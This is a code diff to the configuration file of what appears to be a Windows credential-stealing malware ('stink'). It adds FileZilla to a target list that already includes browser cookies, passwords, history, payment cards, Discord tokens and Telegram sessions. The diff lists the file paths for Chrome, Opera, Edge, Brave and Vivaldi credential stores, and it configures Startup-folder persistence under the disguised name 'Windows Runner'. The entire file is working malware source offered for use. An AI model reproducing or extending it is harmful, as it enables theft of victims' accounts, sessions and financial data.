@@ -4,6 +4,7 @@ from dataclasses import dataclass
 from win32api import GetUserName
 
 
+user_profile = environ["USERPROFILE"]
 user = GetUserName()
 
 
@@ -22,38 +23,38 @@ class ChromiumConfig:
 class MultistealerConfig:
 
     ZipName: str = f"{user}-st"
-    StoragePath: str = rf"{environ['USERPROFILE']}\AppData\stink"
+    StoragePath: str = rf"{user_profile}\AppData\stink"
 
-    Functions: tuple = ("system", "screen", "cookies", "passwords", "history", "processes", "cards", "discord", "telegram")
+    Functions: tuple = ("system", "screen", "cookies", "passwords", "history", "processes", "cards", "discord", "telegram", "filezilla")
 
     ChromePaths: tuple = (
-        rf"{environ['USERPROFILE']}\AppData\Local\Google\Chrome\User Data\Local State",
-        rf"{environ['USERPROFILE']}\AppData\Local\Google\Chrome\User Data",
+        rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Local State",
+        rf"{user_profile}\AppData\Local\Google\Chrome\User Data",
     )
 
     OperaGXPaths: tuple = (
-        rf"{environ['USERPROFILE']}\AppData\Roaming\Opera Software\Opera GX Stable\Local State",
-        rf"{environ['USERPROFILE']}\AppData\Roaming\Opera Software\Opera GX Stable",
+        rf"{user_profile}\AppData\Roaming\Opera Software\Opera GX Stable\Local State",
+        rf"{user_profile}\AppData\Roaming\Opera Software\Opera GX Stable",
     )
 
     OperaDefaultPaths: tuple = (
-        rf"{environ['USERPROFILE']}\AppData\Roaming\Opera Software\Opera Stable\Local State",
-        rf"{environ['USERPROFILE']}\AppData\Roaming\Opera Software\Opera Stable",
+        rf"{user_profile}\AppData\Roaming\Opera Software\Opera Stable\Local State",
+        rf"{user_profile}\AppData\Roaming\Opera Software\Opera Stable",
     )
 
     MicrosoftEdgePaths: tuple = (
-        rf"{environ['USERPROFILE']}\AppData\Local\Microsoft\Edge\User Data\Local State",
-        rf"{environ['USERPROFILE']}\AppData\Local\Microsoft\Edge\User Data",
+        rf"{user_profile}\AppData\Local\Microsoft\Edge\User Data\Local State",
+        rf"{user_profile}\AppData\Local\Microsoft\Edge\User Data",
     )
 
     BravePaths: tuple = (
-        rf"{environ['USERPROFILE']}\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State",
-        rf"{environ['USERPROFILE']}\AppData\Local\BraveSoftware\Brave-Browser\User Data",
+        rf"{user_profile}\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State",
+        rf"{user_profile}\AppData\Local\BraveSoftware\Brave-Browser\User Data",
     )
 
     VivaldiPaths: tuple = (
-        rf"{environ['USERPROFILE']}\AppData\Local\Vivaldi\User Data\Local State",
-        rf"{environ['USERPROFILE']}\AppData\Local\Vivaldi\User Data",
+        rf"{user_profile}\AppData\Local\Vivaldi\User Data\Local State",
+        rf"{user_profile}\AppData\Local\Vivaldi\User Data",
     )
 
 
@@ -75,21 +76,28 @@ class SenderConfig:
 @dataclass
 class AutostartConfig:
 
-    ExecutorPath: str = rf"C:\Users\{user}\AppData\Roaming\Microsoft\Windows"
+    ExecutorPath: str = rf"{user_profile}\AppData\Roaming\Microsoft\Windows"
     AutostartName: str = "Windows Runner"
-    AutostartPath: str = rf"C:\Users\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+    AutostartPath: str = rf"{user_profile}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
     Variables: tuple = ("executor_path", "statuses", "errors")
 
 
 @dataclass
 class DiscordConfig:
 
-    TokensPath: str = rf"C:\Users\{user}\AppData\Roaming\Discord\Local Storage\leveldb"
+    TokensPath: str = rf"{user_profile}\AppData\Roaming\Discord\Local Storage\leveldb"
     Variables: tuple = ("storage_path", "folder", "statuses", "errors")
 
 
 @dataclass
 class TelegramConfig:
 
-    SessionsPath: str = rf"C:\Users\{user}\AppData\Roaming\Telegram Desktop\tdata"
+    SessionsPath: str = rf"{user_profile}\AppData\Roaming\Telegram Desktop\tdata"
+    Variables: tuple = ("storage_path", "folder", "statuses", "errors")
+
+
+@dataclass
+class FileZillaConfig:
+
+    SitesPath: str = rf"{user_profile}\AppData\Roaming\FileZilla"
     Variables: tuple = ("storage_path", "folder", "statuses", "errors")
